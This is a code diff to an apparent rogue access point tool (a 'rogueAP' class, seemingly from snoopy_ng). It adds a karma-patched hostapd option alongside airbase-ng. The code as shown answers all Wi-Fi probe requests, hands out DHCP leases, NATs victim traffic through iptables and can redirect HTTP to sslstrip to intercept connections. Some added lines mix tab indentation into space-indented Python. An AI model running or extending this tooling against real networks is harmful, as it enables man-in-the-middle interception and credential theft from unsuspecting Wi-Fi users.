@@ -29,7 +29,10 @@ class rogueAP:
         self.enable_mon = kwargs.get("enable_mon", False)   # airmon-ng start <wlan_iface> 
         self.promisc =   kwargs.get("promisc", False)       # Answer all probe requests
         self.do_sslstrip = kwargs.get("sslstrip", False)
-
+        self.rogueif = kwargs.get("rogueif", "wlan5")       # Answer all probe requests
+        self.hostapd = kwargs.get("hostapd", False)       # Use hostapd instead of airbase-ng
+        self.hapdconf = kwargs.get("hapdconf", "/root/snoopy_ng/includes/hostapd.conf")       # Config file to use for hostapd
+        self.hapdcmd = kwargs.get("hapdcmd", "/root/hostapd/2.1-karmaian/hostapd/hostapd")       # Binary to use for hostapd
 
         self.procs = {} #Var to hold external processes, and ensure they keep running
         self.num_procs = 2 # How many procs should be run
@@ -52,20 +55,32 @@ class rogueAP:
             self.enable_mon = True
         else:
             self.enable_mon = False
+        if self.hostapd == "True":
+            self.hostapd = True
+        else:
+            self.hostapd = False
 
         if self.enable_mon:
             self.wlan_iface=mm.enable_monitor_mode(self.wlan_iface)
 
         if not self.wlan_iface:
             logging.error("No wlan_iface specified for rogueAP :(")
-            sys.exit(-1)        
-        if self.promisc:    
-            airb_opts = ['-e', self.ssid, '-P', self.wlan_iface]
+            if not self.hostapd:
+                sys.exit(-1)        
+        if self.hostapd:
+            airb_opts = [self.hapdconf]    
+            self.airb_cmd = [self.hapdcmd] + airb_opts
+            self.rogueif = self.wlan_iface
         else:
-            airb_opts = ['-e', self.ssid, self.wlan_iface]
-        self.airb_cmd = ['airbase-ng'] + airb_opts
+            self.rogueif = "at0"
+            if self.promisc:    
+                airb_opts = ['-e', self.ssid, '-P', self.wlan_iface]
+            else:
+                airb_opts = ['-e', self.ssid, self.wlan_iface]
+            self.airb_cmd = ['airbase-ng'] + airb_opts
+
         self.airb_cmd = " ".join(self.airb_cmd)      
-        self.set_ip_cmd = "ifconfig at0 up 10.0.0.1 netmask 255.255.255.0"  
+        self.set_ip_cmd = "ifconfig "+self.rogueif+" up 10.0.0.1 netmask 255.255.255.0"
 
         
         # Vars for DHCP server
@@ -78,7 +93,7 @@ dhcp-leasefile=/etc/dhcpd.leases
         f=open('/etc/dnsmasq.conf', 'w')
         f.write(config_file)
         f.close()
-        self.launch_dhcp = "dnsmasq -d -a 10.0.0.1 -i at0 -C /etc/dnsmasq.conf"
+        self.launch_dhcp = "dnsmasq -d -a 10.0.0.1 -i "+self.rogueif+" -C /etc/dnsmasq.conf"
 
         # Monitor dhcpd.lease file for updates
         with file("/etc/dhcpd.leases", 'a'):
@@ -105,20 +120,21 @@ dhcp-leasefile=/etc/dhcpd.leases
             self.run_sslstrip()
 
     def run_ap(self):
-        run_program("killall airbase-ng")
+        run_program("killall airbase-ng hostapd")
         time.sleep(4)
 
         # Make sure interface exists
         if self.wlan_iface not in netifaces.interfaces():
             logging.error("No such interface: '%s'" % self.wlan_iface)
-            return False
+            if not self.hostapd:
+                return False
         proc = run_program(self.airb_cmd)
         if proc.poll():
             logging.error("Airbase has terminated. Cannot continue.")
             return False
 
-        # Wait for airbase at0 interface to come up
-        while "at0" not in netifaces.interfaces(): #Should add a timeout
+        # Wait for airbase self.rogueif interface to come up
+        while self.rogueif not in netifaces.interfaces(): #Should add a timeout
             logging.debug("Waiting for airbase interface to come up.")
             time.sleep(1)
 
@@ -130,7 +146,7 @@ dhcp-leasefile=/etc/dhcpd.leases
         ipSet = False
         while not ipSet:
             try:
-                if netifaces.ifaddresses('at0')[2][0]['addr']:
+                if netifaces.ifaddresses(self.rogueif)[2][0]['addr']:
                     ipSet = True
             except Exception:
                 time.sleep(2)
@@ -201,7 +217,7 @@ dhcp-leasefile=/etc/dhcpd.leases
 
     def do_nat(self):
         # Handle NAT
-        ipt = ['iptables -F', 'iptables -F -t nat', 'iptables -t nat -A POSTROUTING -o %s -j MASQUERADE'%self.net_iface,  'iptables -A FORWARD -i at0 -o %s -j ACCEPT'%self.net_iface]
+        ipt = ['iptables -F', 'iptables -F -t nat', 'iptables -t nat -A POSTROUTING -o %s -j MASQUERADE'%self.net_iface,  'iptables -A FORWARD -i '+self.rogueif+' -o %s -j ACCEPT'%self.net_iface]
         if self.do_sslstrip:
             ipt.insert(2, 'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
         for rule in ipt:
@@ -257,10 +273,11 @@ dhcp-leasefile=/etc/dhcpd.leases
         #Kill kill kill
         self.notifier.stop()
         run_program("killall airbase-ng")
+		run_program("killall hostapd")
         run_program("killall dnsmasq")
         run_program("killall sslstrip")
         run_program("iptables -F")
-        run_program("killall -F -t nat")
+		run_program("iptables -F -t nat")
         run_program("sysctl -w net.ipv4.ip_forward=0")
         os.remove("/etc/dhcpd.leases")
         os.remove("/tmp/sslstrip.log")
